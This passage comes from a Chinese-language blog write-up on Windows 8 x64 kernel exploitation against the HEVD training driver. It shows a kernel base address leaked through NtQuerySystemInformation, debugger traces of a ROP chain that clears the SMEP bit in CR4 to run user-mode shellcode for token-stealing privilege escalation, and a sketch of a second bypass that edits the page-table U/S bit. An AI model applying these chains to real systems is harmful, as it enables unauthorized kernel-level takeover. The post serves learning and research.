+fffff801`dc7d1998&nbsp;488d0da18fefff&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,[nt!PsLoadedModuleResource&nbsp;(fffff801`dc6ca940)]//指定资源
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x573:
+fffff801`dc7d199f&nbsp;e8bc12c6ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;nt!ExAcquireResourceExclusiveLite&nbsp;(fffff801`dc432c60)//获取线程独占访问资源
+kd&gt;&nbsp;r&nbsp;rdx//wait&nbsp;=&nbsp;true调用者进入等待状态，直到获取资源
+rdx=0000000000000001//</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">随后会进入核心的模块查询函数，这个ExpQueryModuleInformation会遍历kernel的psLoadedModuleList链来获取kernel信息，保存在buffer里，buffer的长度是RTL_PROCESS_MODULE_INFORMATION结构体的长度，然后恢复KernelApcDisable</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x57d:
+fffff801`dc7d19a9&nbsp;458bc6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8d,r14d
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x580:
+fffff801`dc7d19ac&nbsp;488bd3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,rbx
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x583:
+fffff801`dc7d19af&nbsp;e8acb60800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;nt!ExpQueryModuleInformation&nbsp;(fffff801`dc85d060)
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x588:
+fffff801`dc7d19b4&nbsp;89442430&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[rsp+30h],eax//结构信息存入
+kd&gt;&nbsp;dd&nbsp;ffffd00021bc7434
+ffffd000`21bc7434&nbsp;&nbsp;0000ad78&nbsp;dc444a01&nbsp;fffff801&nbsp;03b10000
+ffffd000`21bc7444&nbsp;&nbsp;ffffe000&nbsp;00000000&nbsp;fffff801&nbsp;00000000
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x58c:
+fffff801`dc7d19b8&nbsp;488d0d818fefff&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,[nt!PsLoadedModuleResource&nbsp;(fffff801`dc6ca940)]
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x593:
+fffff801`dc7d19bf&nbsp;e8cc1ac6ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;nt!ExReleaseResourceLite&nbsp;(fffff801`dc433490)//释放资源
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x598://读取KTHREAD
+fffff801`dc7d19c4&nbsp;65488b0c2588010000&nbsp;mov&nbsp;&nbsp;&nbsp;rcx,qword&nbsp;ptr&nbsp;gs:[188h]
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x5a1://获得KernelApcDisable
+fffff801`dc7d19cd&nbsp;0fbf81e4010000&nbsp;&nbsp;movsx&nbsp;&nbsp;&nbsp;eax,word&nbsp;ptr&nbsp;[rcx+1E4h]
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x5a8://自加恢复
+fffff801`dc7d19d4&nbsp;ffc0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x5aa:
+fffff801`dc7d19d6&nbsp;668981e4010000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;word&nbsp;ptr&nbsp;[rcx+1E4h],ax
+kd&gt;&nbsp;p
+nt!ExpQuerySystemInformation+0x5b1://处于恢复状态
+fffff801`dc7d19dd&nbsp;6685c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;ax,ax
+kd&gt;&nbsp;dt&nbsp;nt!_KTHREAD&nbsp;KernelApcDisable&nbsp;ffffe00001cac880
+&nbsp;&nbsp;&nbsp;+0x1e4&nbsp;KernelApcDisable&nbsp;:&nbsp;0n0</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">返回后，直接读取这个buffer，对应就是RTL_PROCESS_MODULES对象，直接读对象的ImageAddress就是模块内核地址了，然后就是构造ROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">typedef&nbsp;struct&nbsp;_RTL_PROCESS_MODULE_INFORMATION&nbsp;{
+HANDLE&nbsp;Section;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Not&nbsp;filled&nbsp;in
+PVOID&nbsp;MappedBase;
+PVOID&nbsp;ImageBase;
+ULONG&nbsp;ImageSize;
+ULONG&nbsp;Flags;
+USHORT&nbsp;LoadOrderIndex;
+USHORT&nbsp;InitOrderIndex;
+USHORT&nbsp;LoadCount;
+USHORT&nbsp;OffsetToFileName;
+UCHAR&nbsp;&nbsp;FullPathName[&nbsp;256&nbsp;];
+}&nbsp;RTL_PROCESS_MODULE_INFORMATION,&nbsp;*PRTL_PROCESS_MODULE_INFORMATION;
+typedef&nbsp;struct&nbsp;_RTL_PROCESS_MODULES&nbsp;{
+ULONG&nbsp;NumberOfModules;
+RTL_PROCESS_MODULE_INFORMATION&nbsp;Modules[&nbsp;1&nbsp;];
+}&nbsp;RTL_PROCESS_MODULES,&nbsp;*PRTL_PROCESS_MODULES;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来我们来看一下通过IDA反汇编的相关函数的伪代码，对应内容我在代码后面写了注释。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;__fastcall&nbsp;ExpQuerySystemInformation(signed&nbsp;int&nbsp;a1,&nbsp;int&nbsp;*a2,&nbsp;unsigned&nbsp;int&nbsp;a3,&nbsp;unsigned&nbsp;__int64&nbsp;a4,&nbsp;unsigned&nbsp;int&nbsp;Size,&nbsp;signed&nbsp;int&nbsp;*a6)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⋯⋯
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;a1;//将功能号的值交给v7
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⋯⋯
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v7&nbsp;==&nbsp;11&nbsp;)//在ExpQuerySystemInformation中会有很多if语句对功能号进行判断，对应功能号执行对应操作，当功能号为11时
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;ExIsRestrictedCaller((unsigned&nbsp;int)(v7&nbsp;-&nbsp;11),&nbsp;a2,&nbsp;5368709120i64)&nbsp;)//检查是否是受限调用
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1073741790;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_WORD&nbsp;*)(*MK_FP(__GS__,&nbsp;392i64)&nbsp;+&nbsp;484i64)&nbsp;=&nbsp;*(_WORD&nbsp;*)(*MK_FP(__GS__,&nbsp;392i64)&nbsp;+&nbsp;484i64)&nbsp;-&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExAcquireResourceExclusiveLite(&amp;PsLoadedModuleResource,&nbsp;v11);//v11的值为1，会等待当前资源释放
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v35&nbsp;=&nbsp;ExpQueryModuleInformation(v34,&nbsp;(_DWORD&nbsp;*)v6,&nbsp;v12,&nbsp;&amp;v166);//PsLoadedModuleList链读取Modules信息，RTL_PROCESS_MODULES结构
+LABEL_95:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v165&nbsp;=&nbsp;v35;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ExReleaseResourceLite(&amp;PsLoadedModuleResource);//释放资源
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v36&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;392i64);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v37&nbsp;=&nbsp;*(_WORD&nbsp;*)(*MK_FP(__GS__,&nbsp;392i64)&nbsp;+&nbsp;484i64)&nbsp;+&nbsp;1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_WORD&nbsp;*)(*MK_FP(__GS__,&nbsp;392i64)&nbsp;+&nbsp;484i64)&nbsp;=&nbsp;v37;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v37&nbsp;&amp;&amp;&nbsp;*(_QWORD&nbsp;*)(v36&nbsp;+&nbsp;152)&nbsp;!=&nbsp;v36&nbsp;+&nbsp;152&nbsp;&amp;&amp;&nbsp;!*(_WORD&nbsp;*)(v36&nbsp;+&nbsp;486)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KiCheckForKernelApcDelivery();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_40;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⋯⋯
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x03 bypass SMEP ROP chain</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在Win8 x64 Medium Integrity下，可以用NtQueryInformation直接获得bypass SMEP的ROP chain。首先可以得到nt的kernel address，通过NTQuerySystemInformation。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;p
+Bypass_SMEP!GetKernelBase+0x8b:
+0033:00007ff7`0075108b&nbsp;33d2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,edx
+kd&gt;&nbsp;r&nbsp;rbx
+rbx=fffff801dc403000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个nt kernel address就是fffff801dc403000，我们接下来构造的ROP chain可以在nt中找到。关于SMEP的控制，取决于cr4寄存器，这个寄存器的比特位们代表了不同的内容。其中，第20位表示的是SMEP的开关。我们可以利用ROP Chain来关闭这个比特位。因此我们需要2个ROP gadgets。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">fffff801`dc54fa10&nbsp;nt!HvlEndSystemInterrupt&nbsp;=&nbsp;&lt;no&nbsp;type&nbsp;information&gt;&nbsp;&nbsp;&nbsp;506f8&nbsp;&nbsp;&nbsp;909090909090&nbsp;&nbsp;&nbsp;&nbsp;+14CA30
+0033:fffff801`dc54fa30&nbsp;59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx
+0033:fffff801`dc54fa31&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
+fffff801`dc5ddba8&nbsp;nt!KeWakeProcessor&nbsp;=&nbsp;&lt;no&nbsp;type&nbsp;information&gt;&nbsp;1506f8&nbsp;&nbsp;&nbsp;&nbsp;+1DABFC
+0033:fffff801`dc5ddbfc&nbsp;0f22e1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cr4,rcx
+0033:fffff801`dc5ddbff&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第一个用于将想修改的cr4的值，交给rcx，第二个用于修改cr4寄存器的值。获取win8下cr4的值，其中，第20bit描述的是SMEP，将其置0关闭SMEP。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;bc&nbsp;0
+kd&gt;&nbsp;g
+Breakpoint&nbsp;1&nbsp;hit
+HEVD!TriggerStackOverflow+0x11c://驱动返回位置
+fffff800`02280bfc&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
+kd&gt;&nbsp;r&nbsp;rsp
+rsp=ffffd0002381e7c8
+kd&gt;&nbsp;dd&nbsp;ffffd0002381e7c8//由于栈溢出，返回地址被覆盖，先是ROP&nbsp;Chain
+ffffd000`2381e7c8&nbsp;&nbsp;dc54fa30&nbsp;fffff801&nbsp;000506f8&nbsp;00000000
+ffffd000`2381e7d8&nbsp;&nbsp;dc5ddbfc&nbsp;fffff801&nbsp;00a60000&nbsp;00000000
+ffffd000`2381e7e8&nbsp;&nbsp;90909090&nbsp;90909090&nbsp;90909090&nbsp;90909090
+ffffd000`2381e7f8&nbsp;&nbsp;90909090&nbsp;90909090&nbsp;dc54fa30&nbsp;fffff801
+ffffd000`2381e808&nbsp;&nbsp;001506f8&nbsp;00000000&nbsp;dc5ddbfc&nbsp;fffff801
+ffffd000`2381e818&nbsp;&nbsp;02281f6e&nbsp;fffff800&nbsp;0231d010&nbsp;ffffe000
+ffffd000`2381e828&nbsp;&nbsp;0231d0e0&nbsp;ffffe000&nbsp;03c3aa80&nbsp;ffffe000
+ffffd000`2381e838&nbsp;&nbsp;0000000e&nbsp;00000000&nbsp;00222003&nbsp;00000000
+kd&gt;&nbsp;p//进入第一个ROP&nbsp;gadget&nbsp;&nbsp;pop&nbsp;rcx获取要修改cr4的值
+nt+0x14ca30:
+fffff801`dc54fa30&nbsp;59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx
+kd&gt;&nbsp;p
+nt+0x14ca31:
+fffff801`dc54fa31&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
+kd&gt;&nbsp;p//将rcx交给cr4，修改cr4的值
+nt+0x1dabfc:
+fffff801`dc5ddbfc&nbsp;0f22e1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cr4,rcx
+kd&gt;&nbsp;r&nbsp;cr4//cr4当前值，20bit位置值为1
+cr4=00000000001506f8
+kd&gt;&nbsp;p
+nt+0x1dabff:
+fffff801`dc5ddbff&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
+kd&gt;&nbsp;r&nbsp;cr4//修改后，20bit位置值为0
+cr4=00000000000506f8
+kd&gt;&nbsp;p//ret后进入shellcode部分，可以执行了
+00000000`00a60000&nbsp;65488b142588010000&nbsp;mov&nbsp;&nbsp;&nbsp;rdx,qword&nbsp;ptr&nbsp;gs:[188h]
+kd&gt;&nbsp;p
+00000000`00a60009&nbsp;4c8b82b8000000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8,qword&nbsp;ptr&nbsp;[rdx+0B8h]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，这次跳转到a60000这个用户地址空间后，也可以继续执行shellcode代码了，cr4的20bit位置置0了，SMEP并没有工作，等待替换token之后，再将cr4寄存器恢复即可。最后提权完成。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0140579a5aa975e52d.png" title="t0140579a5aa975e52d.png" alt="http://p3.qhimg.com/t0140579a5aa975e52d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x04 另一种SMEP绕过方法</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在开头，我提到了一篇比较有意思的show case，里面提到了一种另类的ROP方法，就是用来欺骗SMEP，在pxe中，有一位表示的是U/S，如果我们将这一位修改，让SMEP认为用户空间是可以执行代码的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，我们需要修改之前NtQuerySystemInformation函数获取的内容，来获取hal的内核地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">00000000`01120140&nbsp;&nbsp;68828000&nbsp;fffff801&nbsp;00075000&nbsp;08804000&nbsp;&nbsp;...h.....P...@..
+00000000`01120150&nbsp;&nbsp;00000001&nbsp;00150022&nbsp;7379535c&nbsp;526d6574&nbsp;&nbsp;....&quot;...\SystemR
+00000000`01120160&nbsp;&nbsp;5c746f6f&nbsp;74737973&nbsp;32336d65&nbsp;6c61685c&nbsp;&nbsp;oot\system32\hal
+00000000`01120170&nbsp;&nbsp;6c6c642e&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;.dll............
+0033:00007ff7`157e10b0&nbsp;4963c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movsxd&nbsp;&nbsp;rax,r11d
+0033:00007ff7`157e10b3&nbsp;4869c028010000&nbsp;&nbsp;imul&nbsp;&nbsp;&nbsp;&nbsp;rax,rax,128h//获得距离SYSTEM_MODULE_INFORMATION起始地址的偏移
+0033:00007ff7`157e10ba&nbsp;488d4c3830&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,[rax+rdi+30h]//30h是模块名称成员距离模块起始的偏移，rcx得到模块成员名称的地址
+0033:00007ff7`157e10bf&nbsp;493bc9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,r9//判断模块名称是否是我们需要的模块名称
+0033:00007ff7`157e10c2&nbsp;7503&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bypass_SMEP!GetKernelBase+0xc7&nbsp;(00007ff7`157e10c7)
+0033:00007ff7`157e10c4&nbsp;488b1a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rbx,qword&nbsp;ptr&nbsp;[rdx]
+0033:00007ff7`157e10c7&nbsp;41ffc3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r11d</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">修改的源码如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;Int_3();
+&nbsp;&nbsp;&nbsp;&nbsp;NtQuerySystemInformation(SystemModuleInformation,&nbsp;ModuleInfo,&nbsp;len,&nbsp;&amp;len);
+&nbsp;&nbsp;&nbsp;&nbsp;//try&nbsp;to&nbsp;catch&nbsp;HAL&nbsp;kernel&nbsp;address
+&nbsp;&nbsp;&nbsp;&nbsp;for(i=0;i&lt;ModuleInfo-&gt;NumberOfModules;i++)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!strcmp(ModuleInfo-&gt;Module[i].Name,&quot;\\SystemRoot\\system32\\hal.dll&quot;))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kernelBase&nbsp;=&nbsp;ModuleInfo-&gt;Module[i].ImageBaseAddress;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在构造rop chain的时候，我们需要下面几个rop gadgets。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1、mov rsp,48000000df &nbsp;jmp to user space//maybe不用？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2、pop rcx with 0x63 to reset pxe</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3、pop rax with pxe(my_addr)-3&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4、mov [rax],ecx</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">5、invalid TLB(会更新PTE，导致U/S位失效)wbinvd</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">6、ret to shellcode</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">本来想试验这个过程，但是有些rop gadget无法获取了，读那个文章中，作者提到了一个stack pivot的地址，利用的是HalpTscTraceProcessorSynchronization函数中的一个位置，可以使rsp栈帧跳转到480000df地址，这是可以通过用户申请的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但我没有找到这样的地址，我尝试在hal内存空间中搜索这样的rop gadget，也没有找到，但我觉得这个并不影响，可以通过virtualalloc申请，把第二个rop gadget先覆盖在ret即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二个rop gadget需要将0x63赋值给rcx寄存器，这个值用于重新设置pxe中的U/S位。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第三个rop gadget需要将pxe的值交给rax。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;!pte&nbsp;fffff80aa2c35bfc
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VA&nbsp;fffff80aa2c35bfc
+PXE&nbsp;at&nbsp;FFFFF6FB7DBEDF80&nbsp;&nbsp;&nbsp;&nbsp;PPE&nbsp;at&nbsp;FFFFF6FB7DBF0150&nbsp;&nbsp;&nbsp;&nbsp;PDE&nbsp;at&nbsp;FFFFF6FB7E02A8B0&nbsp;&nbsp;&nbsp;&nbsp;PTE&nbsp;at&nbsp;FFFFF6FC055161A8
+Unable&nbsp;to&nbsp;get&nbsp;PXE&nbsp;FFFFF6FB7DBEDF80</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第四个rop gadget需要修改pxe的u/s位，也就是mov [rax],ecx。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里比较有趣的就是第五个rop gadget，这是hal.dll中的一个invalid TLB cache，禁用快表，因为虚拟地址和物理地址转换的时候，有可能会去TLB中直接搜索缓存的地址，如果命中就直接提取。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里禁用TLB之后，就可以直接去PTE中找对应地址。令我们修改后的U/S起效果。wbinvd汇编指令会禁用这个缓存。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">.text:00000001C003B8A0&nbsp;HalpAcpiFlushCache&nbsp;proc&nbsp;near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;HalpFlushAndWait+9p
